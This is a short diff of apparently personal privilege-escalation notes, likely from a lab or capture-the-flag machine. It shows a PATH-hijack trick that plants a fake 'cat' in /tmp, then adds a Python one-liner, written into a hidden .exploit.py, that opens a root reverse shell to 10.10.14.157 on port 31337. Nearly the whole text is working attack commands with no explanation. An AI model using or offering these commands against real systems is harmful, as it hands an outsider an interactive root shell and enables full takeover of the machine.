@@ -10,3 +10,8 @@ cd /tmp/
 echo '/bin/sh' > cat
 chmod +x cat
 
+==========
+use PY for root reverse shell
+
+
+echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
